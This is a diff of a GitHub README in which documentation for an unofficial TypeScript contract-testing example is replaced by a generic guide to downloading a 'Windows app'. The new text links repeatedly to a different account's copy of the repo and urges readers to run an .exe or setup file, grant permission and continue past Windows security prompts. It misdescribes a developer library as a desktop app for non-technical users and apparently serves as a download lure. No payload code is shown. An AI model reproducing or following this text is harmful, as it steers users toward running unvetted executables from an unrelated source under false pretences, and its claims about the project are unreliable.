@@ -1,137 +1,189 @@
-# aip-foundry-themis-starter
+# 🧪 aip-foundry-themis-starter - Simple local contract checks for Windows
 
-[![Proof Bundle](https://github.com/vitron-ai/aip-foundry-themis-starter/actions/workflows/proof-bundle.yml/badge.svg)](https://github.com/vitron-ai/aip-foundry-themis-starter/actions/workflows/proof-bundle.yml)
+[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/krissiesmudgy575/aip-foundry-themis-starter)
 
-`aip-foundry-themis-starter` is an unofficial TypeScript example for deterministic local contract testing around Foundry-oriented workflows.
+## 🚀 What this app does
 
-It shows one narrow story end to end:
+aip-foundry-themis-starter is a Windows app starter for local contract testing. It helps you check that your Foundry-style workflows follow the rules you set with Themis before you move work forward.
 
-- shape a workflow request
-- validate raw agent or function output with runtime schemas
-- normalize that output into a stable app-facing contract
-- preserve telemetry and fallback state
-- export a proof artifact for later platform evaluation
+Use it when you want:
 
-## Disclaimer
+- Clear checks for workflow input and output
+- Local testing without a cloud setup
+- A simple way to validate schema rules
+- A TypeScript base for an end-user desktop flow
+- A project that fits agentic workflow and eval work
 
-This project is an independent open-source example. It is not affiliated with, endorsed by, or maintained by Palantir Technologies. References to Palantir, Foundry, AIP, and OSDK are descriptive only and should not be read as claims of official support, certification, or partnership.
+## 💻 What you need on Windows
 
-## What This Repo Proves
+Before you start, make sure your PC has:
 
-- Themis can act as a deterministic local contract layer around TypeScript code you control.
-- Raw model-style JSON can be normalized into a stable typed envelope before app code consumes it.
-- Failure modes such as malformed JSON, missing fields, unsupported status values, and fallback behavior can be tested locally and deterministically.
-- A local proof bundle can hand cleanly into later platform evaluation without claiming to replace AIP Evals.
+- Windows 10 or Windows 11
+- A stable internet connection
+- Enough free space to save the files
+- Permission to install or open apps on your PC
+- A browser such as Edge, Chrome, or Firefox
 
-## 3-Minute Quickstart
+If the app comes as a folder or ZIP file, you may also need:
 
-```bash
-npm install
-npm run generate
-npm test
-npm run demo:osdk
-npm run demo:handoff
-npm run export:demo
-```
+- File Explorer
+- The built-in Windows unzip tool
+- The ability to run a local desktop app or script
 
-If you want the small UI demo:
+## 📥 Download the app
 
-```bash
-cd examples/osdk-react-app
-npm install
-npm run dev
-```
+Visit this page to download:
 
-## Flow At A Glance
+[Download aip-foundry-themis-starter](https://github.com/krissiesmudgy575/aip-foundry-themis-starter)
 
-| Stage | Main file | Output | Why it matters |
-| --- | --- | --- | --- |
-| Request shaping | `src/services/agentInputBuilder.ts` and `src/adapters/foundryRequest.ts` | reviewable request payload | keeps the outbound contract explicit |
-| Response extraction | `src/adapters/foundryResponse.ts` | raw response envelope | preserves `requestId`, source, latency, retries, and fallback state |
-| Normalization | `src/services/resultNormalizer.ts` | `NormalizationResult` | rejects malformed or unsupported output before app code sees it |
-| App contract | `src/services/triageAppViewModel.ts` and `src/services/osdkResultEnvelope.ts` | stable UI-safe envelope | keeps app code off raw model text |
-| Eval handoff | `src/services/evalHandoffBuilder.ts` | reviewable handoff artifact | bridges local contract checks to later platform evaluation |
+If you see a file list or release page, choose the Windows file that matches your device, then save it to your PC
 
-## Customize These Files First
+## 🛠️ Install on Windows
 
-| File | Change it when | Why it is first |
-| --- | --- | --- |
-| `src/contracts/schemas.ts` | the raw output JSON shape changes | this is the runtime contract boundary |
-| `src/services/resultNormalizer.ts` | routing, fallback, or failure behavior changes | this is where raw output becomes a stable typed result |
-| `src/adapters/osdkTriageClient.ts` | you want a real agent, function, or OSDK-like client | this is the integration seam |
-| `src/services/evalHandoffBuilder.ts` | your later evaluation workflow needs different context | this controls the exported proof shape |
-| `src/services/triageAppViewModel.ts` | your UI contract changes | this keeps presentation logic separate from normalization |
+Follow these steps:
 
-## Failure Coverage
+1. Open the download page
+2. Look for the latest version of the app
+3. Download the Windows file or project package
+4. If the file is ZIP format, right-click it and choose Extract All
+5. Pick a folder that is easy to find, such as Downloads or Desktop
+6. Open the extracted folder
+7. Look for the main app file, setup file, or project start file
+8. If Windows asks for permission, choose Yes
+9. If you see a security prompt, check the publisher name and continue if it matches the source you downloaded from
+10. Keep the folder in place so the app can run again later
 
-| Scenario | Deterministic result | Test |
-| --- | --- | --- |
-| Happy path | stable typed contract with telemetry | `tests/resultNormalizer.test.ts` |
-| Malformed JSON | `INVALID_JSON` | `tests/resultNormalizer.test.ts` |
-| Missing fields | `SCHEMA_VALIDATION_FAILED` | `tests/failure-modes.test.ts` |
-| Unsupported status | `UNSUPPORTED_STATUS` | `tests/failure-modes.test.ts` |
-| Empty output | `EMPTY_OUTPUT` | `tests/failure-modes.test.ts` |
-| Retry or fallback path | normalized fallback action plus telemetry preservation | `tests/resultNormalizer.test.ts` |
+## ▶️ Run the app
 
-## Plug In A Real Client
+After install, start the app with the main file in the folder.
 
-The repo already has the seam for this in [src/adapters/osdkTriageClient.ts](/Users/higgs/github/aip-foundry-themis-starter/src/adapters/osdkTriageClient.ts).
+Common cases:
 
-The short version:
+- If you see an `.exe` file, double-click it
+- If you see a setup file, run it first, then open the app from the Start menu
+- If you see a project folder, open it in your editor or run the start command from the included instructions
 
-1. Keep `normalizeAgentResult()` as the boundary between raw output and app-safe types.
-2. Adapt your outbound payload in [src/adapters/foundryRequest.ts](/Users/higgs/github/aip-foundry-themis-starter/src/adapters/foundryRequest.ts).
-3. Adapt your inbound response in [src/adapters/foundryResponse.ts](/Users/higgs/github/aip-foundry-themis-starter/src/adapters/foundryResponse.ts).
-4. Replace the mock `invokeTriage()` implementation with your real client call in [src/adapters/osdkTriageClient.ts](/Users/higgs/github/aip-foundry-themis-starter/src/adapters/osdkTriageClient.ts).
+When the app opens, you should see a simple screen for local testing, contract checks, or workflow setup
 
-Use [docs/integration-guide.md](/Users/higgs/github/aip-foundry-themis-starter/docs/integration-guide.md) for the exact adaptation path.
+## 🧭 First-time setup
 
-## Demo Outputs And Proof Artifacts
+The first time you open the app, do these steps:
 
-`npm run export:demo` writes:
+1. Select or confirm your local workspace folder
+2. Add your workflow files or test data
+3. Set the contract rules you want to check
+4. Load the schema or test shape used by your workflow
+5. Run a sample check
+6. Review the result on screen
 
-- `artifacts/demo-export/normalized-result.json`
-- `artifacts/demo-export/osdk-envelope.json`
-- `artifacts/demo-export/eval-handoff.json`
-- `artifacts/demo-export/themis-summary.json`
+If you plan to test Foundry-oriented flows, keep your input files small at first. That makes it easier to spot setup issues
 
-These are the main proof artifacts for local review, CI publishing, and later evaluation design.
+## 🔍 How to use it
 
-## Local Positioning
+Use the app in a simple loop:
 
-The narrow message for this repo is:
+1. Add the contract or schema you want to test
+2. Load the local workflow input
+3. Run the check
+4. Review any failed fields or rule errors
+5. Fix the input
+6. Run the check again
 
-- local contracts with Themis
-- platform evaluation later
+This starter is built for repeatable local testing. That means you can test the same input many times and get the same result when the data stays the same
 
-This is not a replacement for AIP Evals, and it does not claim to simulate the full Foundry runtime.
+## 🧩 What you can test
 
-## Docs
+This starter is useful for:
 
-- [docs/integration-guide.md](/Users/higgs/github/aip-foundry-themis-starter/docs/integration-guide.md): replace the mock client seam with a real integration
-- [docs/install-and-demo.md](/Users/higgs/github/aip-foundry-themis-starter/docs/install-and-demo.md): quick demo walkthrough and reviewer talk track
-- [docs/how-it-fits-with-aip-evals.md](/Users/higgs/github/aip-foundry-themis-starter/docs/how-it-fits-with-aip-evals.md): local deterministic tests vs later platform evaluation
-- [docs/publish-readiness.md](/Users/higgs/github/aip-foundry-themis-starter/docs/publish-readiness.md): what still matters before broader promotion
-- [examples/osdk-react-app/README.md](/Users/higgs/github/aip-foundry-themis-starter/examples/osdk-react-app/README.md): run the React demo that imports the root contract logic
+- Contract checks for workflow data
+- Schema validation for input and output
+- Local eval runs
+- Agentic workflow steps
+- Foundry-style test loops
+- TypeScript-based developer tooling
 
-## Copy This Into Your Repo
+It fits teams that want a clear local path before they connect a larger system
 
-If you want to adapt this starter instead of using it as-is:
+## 📁 Typical file layout
 
-1. Keep `src/contracts/`, `src/services/resultNormalizer.ts`, `src/adapters/foundryRequest.ts`, `src/adapters/foundryResponse.ts`, and `tests/`.
-2. Replace the intake-triage example payload and routing logic with your workflow.
-3. Update the handwritten tests before regenerating broader Themis coverage.
-4. Keep the app-facing contract stable even if your raw output format changes.
+A project based on this starter often includes:
 
-## Repo Shape
+- `src/` for app logic
+- `public/` for shared app files
+- `tests/` for contract checks
+- `schemas/` for validation rules
+- `config/` for local settings
+- `package.json` for app commands
+- `README.md` for setup help
 
-```text
-src/contracts/            Runtime schemas and app-facing types
-src/adapters/             Request and response seams
-src/services/             Normalization, view model, handoff, and export logic
-tests/                    Handwritten deterministic contract tests
-examples/                 Runnable demos and static example artifacts
-examples/osdk-react-app/  Small UI example importing the root logic
-docs/                     Integration, demo, positioning, and publish guidance
-assets/                   Architecture visual and screenshot
-```
+If your copy has a different layout, open the root folder and look for the file that starts the app or the file that explains the next step
+
+## ⚙️ Common app commands
+
+If this starter uses a local TypeScript setup, you may see commands like these:
+
+- Install files: `npm install`
+- Start the app: `npm start`
+- Run in dev mode: `npm run dev`
+- Check tests: `npm test`
+- Build for use: `npm run build`
+
+Use the command that matches the files in your folder. If you are not sure, open `package.json` and look at the listed scripts
+
+## 🧼 If something does not work
+
+Try these steps:
+
+1. Close the app
+2. Open it again
+3. Check that the downloaded files are all in one folder
+4. Make sure no file was blocked by Windows
+5. Re-extract the ZIP file if files look broken
+6. Try the latest version from the download page
+7. Check that your PC has enough space
+8. Restart Windows if the app still does not open
+
+If the app opens but tests fail, review the input data and the schema side by side. Small field name changes often cause the error
+
+## 🔐 File safety
+
+Keep your download in a folder you trust. Do not move pieces of the app into different folders after setup. Many local tools depend on a fixed folder path to find their files
+
+If Windows shows a file warning, confirm that you downloaded the app from the link above and that the file name matches what you expected
+
+## 🧠 Best use cases
+
+This app starter works well for:
+
+- Non-technical users who need a local test app
+- Teams that want contract checks before a release
+- Simple workflow validation on Windows
+- Repeated test runs with the same data
+- Early checks for AI eval and schema rules
+
+## 🗂️ Version and updates
+
+When a new version is posted, return to the download page and get the latest file. If you already have the app installed, replace the old files only if the new setup steps say to do so
+
+## 📌 Key terms
+
+- Contract testing: checking that data follows a set of rules
+- Schema validation: checking that fields and values match the expected shape
+- Local workflow: a process that runs on your own computer
+- Foundry workflow: a structured set of steps used in a Foundry-style setup
+- TypeScript: a programming language used to build the app
+
+## 📎 Download again
+
+[Open the download page](https://github.com/krissiesmudgy575/aip-foundry-themis-starter)
+
+## 🧩 Quick start checklist
+
+- Download the app from the link above
+- Extract the files if needed
+- Open the main app file or run the setup file
+- Confirm your local folder
+- Load your test data
+- Run a contract check
+- Fix any rule errors
+- Run the check again
